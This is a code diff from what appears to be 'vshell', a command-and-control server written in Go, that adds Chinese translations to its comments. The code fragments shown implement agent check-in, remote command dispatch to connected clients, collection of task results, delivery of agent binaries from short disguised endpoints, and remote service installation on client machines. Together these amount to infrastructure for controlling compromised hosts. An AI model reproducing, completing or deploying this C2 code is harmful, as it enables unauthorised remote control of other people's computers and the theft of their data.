@@ -16,7 +16,8 @@ import (
 	"vshell/models"
 )
 
-// C2Engine manages C2 client communication and command dispatch
+// C2Engine 管理 C2 客户端通信与命令派发。
+// C2Engine manages C2 client communication and command dispatch.
 // (updated to use the c2engine package)
 type C2Engine struct {
 	mu               sync.RWMutex
@@ -24,7 +25,8 @@ type C2Engine struct {
 	listenerServers  map[int64]*http.Server
 }
 
-// ClientSession tracks a connected agent
+// ClientSession 跟踪一个已连接的 Agent。
+// ClientSession tracks a connected agent.
 type ClientSession struct {
 	ClientID    int64      `json:"client_id"`
 	VerifyKey   string     `json:"verify_key"`
@@ -33,7 +35,8 @@ type ClientSession struct {
 	InitialData *ClientInfo `json:"initial_data,omitempty"`
 }
 
-// ClientInfo holds the initial registration data
+// ClientInfo 保存 Agent 初始注册数据。
+// ClientInfo holds the initial registration data.
 type ClientInfo struct {
 	HostName    string `json:"hostname"`
 	UserName    string `json:"username"`
@@ -49,7 +52,8 @@ var c2 = &C2Engine{
 	listenerServers: make(map[int64]*http.Server),
 }
 
-// RegisterC2Routes adds C2 API endpoints to the HTTP mux
+// RegisterC2Routes 将 C2 API 端点注册到 HTTP mux。
+// RegisterC2Routes adds C2 API endpoints to the HTTP mux.
 func RegisterC2Routes(mux *http.ServeMux, basePath string, listenerID int64, verifyKey string) {
 	prefix := fmt.Sprintf("%s/l/%d", basePath, listenerID)
 	mux.HandleFunc(prefix+"/checkin", c2.handleCheckin(listenerID, verifyKey))
@@ -58,6 +62,8 @@ func RegisterC2Routes(mux *http.ServeMux, basePath string, listenerID int64, ver
 	log.Printf("[C2] Registered routes at %s for listener %d", prefix, listenerID)
 }
 
+// handleCheckin 处理 Agent 签到（注册/心跳）。
+// handleCheckin handles agent check-in (registration/heartbeat).
 func (e *C2Engine) handleCheckin(listenerID int64, verifyKey string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		if r.Method != "POST" {
@@ -143,6 +149,8 @@ func (e *C2Engine) handleCheckin(listenerID int64, verifyKey string) http.Handle
 	}
 }
 
+// handleTasks 处理 Agent 任务轮询。
+// handleTasks handles agent task polling.
 func (e *C2Engine) handleTasks(listenerID int64) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		clientIDStr := r.URL.Query().Get("client_id")
@@ -205,6 +213,8 @@ func (e *C2Engine) handleTasks(listenerID int64) http.HandlerFunc {
 	}
 }
 
+// handleResult 处理 Agent 任务结果回传。
+// handleResult handles agent task result submission.
 func (e *C2Engine) handleResult(listenerID int64) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		if r.Method != "POST" {
@@ -259,7 +269,8 @@ func (e *C2Engine) handleResult(listenerID int64) http.HandlerFunc {
 	}
 }
 
-// DispatchCommand sends a command to a client via c2engine
+// DispatchCommand 通过 c2engine 向客户端发送命令。
+// DispatchCommand sends a command to a client via c2engine.
 func DispatchCommand(clientID int64, command string, timeout int) (int64, error) {
 	engine := c2engine.GetEngine()
 
@@ -282,7 +293,8 @@ func DispatchCommand(clientID int64, command string, timeout int) (int64, error)
 	return task.ID, nil
 }
 
-// GetActiveClients returns all currently active client sessions
+// GetActiveClients 返回当前所有活跃的客户端会话。
+// GetActiveClients returns all currently active client sessions.
 func GetActiveClients() []*ClientSession {
 	c2.mu.RLock()
 	defer c2.mu.RUnlock()
@@ -295,7 +307,8 @@ func GetActiveClients() []*ClientSession {
 	return result
 }
 
-// IsClientOnline checks if a client is currently connected
+// IsClientOnline 检查客户端当前是否在线。
+// IsClientOnline checks if a client is currently connected.
 func IsClientOnline(clientID int64) bool {
 	c2.mu.RLock()
 	defer c2.mu.RUnlock()
@@ -312,7 +325,8 @@ func IsClientOnline(clientID int64) bool {
 	return ok && time.Since(s.LastSeen) < 60*time.Second
 }
 
-// StartListenerC2 registers the C2 endpoints for a listener
+// StartListenerC2 为监听器注册 C2 端点。
+// StartListenerC2 registers the C2 endpoints for a listener.
 func StartListenerC2(listener *models.Listener) {
 	// Register with c2engine
 	engine := c2engine.GetEngine()
@@ -344,7 +358,8 @@ func StartListenerC2(listener *models.Listener) {
 // Exported C2 Route Handlers (called from router)
 // ============================================================================
 
-// HandleC2Checkin handles agent check-in at /c2/l/{id}/checkin
+// HandleC2Checkin 处理 /c2/l/{id}/checkin 的 Agent 签到。
+// HandleC2Checkin handles agent check-in at /c2/l/{id}/checkin.
 func HandleC2Checkin(w http.ResponseWriter, r *http.Request, listenerID int64, verifyKey string) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", 405)
@@ -412,7 +427,8 @@ func HandleC2Checkin(w http.ResponseWriter, r *http.Request, listenerID int64, v
 	})
 }
 
-// HandleC2Tasks handles agent task polling at /c2/l/{id}/tasks
+// HandleC2Tasks 处理 /c2/l/{id}/tasks 的 Agent 任务轮询。
+// HandleC2Tasks handles agent task polling at /c2/l/{id}/tasks.
 func HandleC2Tasks(w http.ResponseWriter, r *http.Request, listenerID int64) {
 	clientIDStr := r.URL.Query().Get("client_id")
 	if clientIDStr == "" {
@@ -466,8 +482,9 @@ func HandleC2Tasks(w http.ResponseWriter, r *http.Request, listenerID int64) {
 }
 
 // HandleC2Result handles agent task result submission at /c2/l/{id}/result
+// HandleAgentDelivery 在下发端点（/swt、/sww、/swk、/sws、/swd、/swl、/swld）提供 Agent 二进制。
 // HandleAgentDelivery serves agent binaries at the delivery endpoints
-// (/swt, /sww, /swk, /sws, /swd, /swl, /swld)
+// (/swt, /sww, /swk, /sws, /swd, /swl, /swld).
 func HandleAgentDelivery(agentType, platform, arch string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		info := c2engine.GetBuildInfo(platform, arch, agentType)
@@ -491,7 +508,8 @@ func HandleAgentDelivery(agentType, platform, arch string) http.HandlerFunc {
 	}
 }
 
-// HandleC2Result handles agent task result submission at /c2/l/{id}/result
+// HandleC2Result 处理 /c2/l/{id}/result 的 Agent 任务结果回传。
+// HandleC2Result handles agent task result submission at /c2/l/{id}/result.
 func HandleC2Result(w http.ResponseWriter, r *http.Request, listenerID int64) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", 405)
@@ -545,7 +563,8 @@ func HandleC2Result(w http.ResponseWriter, r *http.Request, listenerID int64) {
 // Service Install/Remove — matched to SPA /install/install and /install/remove
 // ============================================================================
 
-// HandleServiceInstall handles the SPA's /install/install endpoint (service install)
+// HandleServiceInstall 处理 SPA 的 /install/install 端点（服务安装）。
+// HandleServiceInstall handles the SPA's /install/install endpoint (service install).
 func HandleServiceInstall(w http.ResponseWriter, r *http.Request) {
 	clientID := r.FormValue("id")
 	serviceName := r.FormValue("name")
@@ -578,7 +597,8 @@ func HandleServiceInstall(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
-// HandleServiceRemove handles the SPA's /install/remove endpoint (service uninstall)
+// HandleServiceRemove 处理 SPA 的 /install/remove 端点（服务卸载）。
+// HandleServiceRemove handles the SPA's /install/remove endpoint (service uninstall).
 func HandleServiceRemove(w http.ResponseWriter, r *http.Request) {
 	clientID := r.FormValue("id")
 	serviceName := r.FormValue("name")
